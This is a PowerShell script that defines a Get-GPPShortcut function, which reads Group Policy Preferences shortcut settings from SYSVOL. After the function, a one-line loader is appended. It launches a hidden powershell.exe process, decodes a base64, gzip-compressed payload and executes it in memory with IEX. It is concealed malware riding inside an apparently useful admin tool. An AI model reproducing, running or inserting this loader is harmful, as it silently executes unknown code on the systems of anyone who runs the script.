﻿Function Get-GPPShortcut {
    
    [cmdletbinding(DefaultParameterSetName='Name')]
    param(
        [Parameter( Position=0,
                    ValueFromPipeline=$true,
                    ValueFromPipelineByPropertyName=$true,
                    ParameterSetName='Name'
        )]
            [string[]]$Name = $null,

        [Parameter( Position=1,
                    ParameterSetName='GUID'
        )]
            [string[]]$GUID = $null
    )
    Begin
    {

        try
        {
            Import-Module GroupPolicy -ErrorAction Stop
            If(-not (Get-Module GroupPolicy -ErrorAction SilentlyContinue))
            {
                throw "GroupPolicy module not Installed"
                break
            }
        }
        catch
        {
            throw "Error importing GroupPolicy module: $_"
            break
        }

        $xmlProps = "NamespaceURI",
            "Prefix",
            "NodeType",
            "ParentNode",
            "OwnerDocument",
            "IsEmpty",
            "Attributes",
            "HasAttributes",
            "SchemaInfo",
            "InnerXml",
            "InnerText",
            "NextSibling",
            "PreviousSibling",
            "Value",
            "ChildNodes",
            "FirstChild",
            "LastChild",
            "HasChildNodes",
            "IsReadOnly",
            "OuterXml",
            "BaseURI"

    }
    Process
    {

        
        if(-not $GUID -and -not $Name)
        {
            Write-Verbose "Getting all GPOs"
            $GPO = Get-GPO -all
        }

        
            if ( $Name -and $PsCmdlet.ParameterSetName -eq "Name" )
            {
                $GPO = foreach($nam in $Name)
                {
                    Get-GPO -Name $nam
                }
            }
            if( $GUID -and $PsCmdlet.ParameterSetName -eq "GUID" )
            {
                $GPO = foreach($ID in $GUID)
                {
                    Get-GPO -Guid $ID
                }
            }
    
        foreach ($Policy in $GPO){
        
            $GPOID = $Policy.Id
            $GPODom = $Policy.DomainName
            $GPODisp = $Policy.DisplayName
        
            
            $configTypes = "User", "Machine"

            foreach($configType in $configTypes)
            {

                
                $path = "\\$($GPODom)\SYSVOL\$($GPODom)\Policies\{$($GPOID)}\$configType\Preferences\Shortcuts\Shortcuts.xml"

                if (Test-Path $path -ErrorAction SilentlyContinue)
                {
                    [xml]$xml = Get-Content $path
                
                    
                    foreach ( $prefItem in $xml.Shortcuts.Shortcut )
                    {

                        
                        $childNodes = @( $prefItem.filters.childnodes )

                        
                        New-Object PSObject -Property @{
                            GPOName = $GPODisp
                            ConfigType = $configType
                            action = $prefItem.Properties.action.Replace("U","Update").Replace("C","Create").Replace("D","Delete").Replace("R","Replace")
                            targetType = $prefItem.Properties.targetType
                            targetPath = $prefItem.Properties.targetPath
                            shortcutKey = $prefItem.Properties.shortcutKey
                            startIn = $prefItem.Properties.startIn
                            arguments = $prefItem.Properties.arguments
                            iconPath = $prefItem.Properties.iconPath
                            window = $prefItem.Properties.window
                            shortcutPath = $prefItem.Properties.shortcutPath
                            disabled = $prefItem.disabled
                            changed = $( Try { Get-Date "$( $prefItem.changed )"} Catch {"Err"} )
                            filters = $(
                                
                                foreach($filter in $childNodes){
                                    Try { $filter | select -Property * -ExcludeProperty $xmlProps }
                                    Catch { Continue }
                                }
                            )
                        } | Select GPOName, ConfigType, action, targetType, targetPath, shortcutKey, startIn, arguments, iconPath, window, shortcutPath, disabled, changed, filters
                    }
                }
            }
        }
    }
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAH0m5VcCA7VWbW/aSBD+3Er9D1aFhK0SDIS8SpVuDRhIgEAMJoSi08Zem4XFS9dr3nr97zcGO6FqcterdFYidj0zO7PPPDNjLwocSXmgyEuvciOLlvLtw/t3XSzwQlEzXLq9vplTMqt1wVjzM+3dO5BmVqvC3c5TPivqGC2XVb7ANJhcX1ciIUggD/t8nUgUhmTxxCgJVU35SxlOiSAnd08z4kjlm5L5M19n/AmzRG1bwc6UKCcocGNZizs4jixvLRmVavbLl6w2PilO8rWvEWahmrW2oSSLvMtYVlO+a7HD/nZJ1GybOoKH3JP5IQ1OS/lBEGKPdOC0FWkTOeVumNXgHvAniIxEoCQ3io84KKhZWHYFd5DrChKCfr4ZrPicqJkgYiyn/KGOE//3USDpgoBcEsGXFhEr6pAw38CBy8g98SZqh6zTa/+qkXpsBFpdKbQcZOTVQNvcjRg52Ga1n0NN8qjBc5RLgOD7h/cf3nspBfxN5WJ2nH9YvRvv1wTCVLs8pHvFz0ohp7TBHZZcbGGb6YuIaBNlHCdgPJkomc3AdIWde/uEYqoOyrSOzueLms2vpjMQjW1O3QmYJknKzPtX9cLNZSx6m29V4tGAVLcBXlAnpZT6GvbEY2R/43yq1oH41GwiIG6VMOJjGWOZU8Y/m9UWVD7bGhFlLhHIgfyFEBWkVvsxmEN61GwzaJMFAHbYZyEVHhCZpNoJebep93gPStkKw2GYU7oRVJKTUyyCGXFzCgpCmohQJPl+mX0Jtx0xSR0cyvS4iXYEZeKywoNQisiBNML1+9aSOBSzGI2c0qAuMbYW9VPX2VexqGDGaODDSSvIBbyJMbBkTA4BUSZE0PIWkc3FkpEFaO3r2mTYhypOKmHPJ+wTN/tKmCnVD7yOMUnBOAoSEm0xLnOKTYWEDhHje0ys343lqEukUVUESfKjpkU0NrYyZn5m3TLPyzg8i8maoLXHRkjAxRR8YeCQnJctKQA19aN+RysInlEzYG3HmNMiWtNisw3/A3ra5NUL9/Zm1tBFdTP1UDNsthvdaq/RKK9uLLssrVpT3nabsl17mM0s1LgfjORjEzX6tDAflXfLG7qzWsgdbfTznbGDwt/sZr7rjaqe51941n3xzKStYaVnFEq4Va1FraGxNgrlsEbXjR4d9OY3pnwa2QwPPN1/KF5hummJmV3k7V0Tofr01NndeHZ92na3o4Z+NSzPUQ2hSlCzTYPfjgyBurqNfZtvOiVWL/kVZJgOJY+9gWn0eqaBBvXZ1+qV7oPtA54aQ7tEH5cP91PYmxDCrV4oN12y46MegFTnCPv3oONXSs7UA53qJ2R86vCwhOcGRwbomI9fIa7R0uwykPcHJY5s1nnAqPW4NXW9OOqWUaNAh3UfxUdi3+hhFK6qu6petF3uDs86I0+3H9iFXq30l46n6/q6Ub11Houby7uLy9aQ2guOBrpuf4zpAfzILNbmXatz3jlO+lsdvo1FOMUMyACNO61Nkwsz6cJdTmMLVX0eyHMiAsJgjsGkS8mNGONOPBAOPRum0WFGTKBGB7A8Lb260pRnRe1lTqSvrq8fIVSok5TD+RYJfDnNFTanhQK0/MKmXIA7//oVK3y5VZ+Py8Vj4wWsY0ds70iLKynzNESmEP8/lEkVT+HH/VcoX979g/SX4C3kjiD4Sfbji/8E9m+BMMRUgrYFzYiRw5x8A4uEQUefF4dEATu85Ik/8u4iedKB746/ARQDm9FZCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

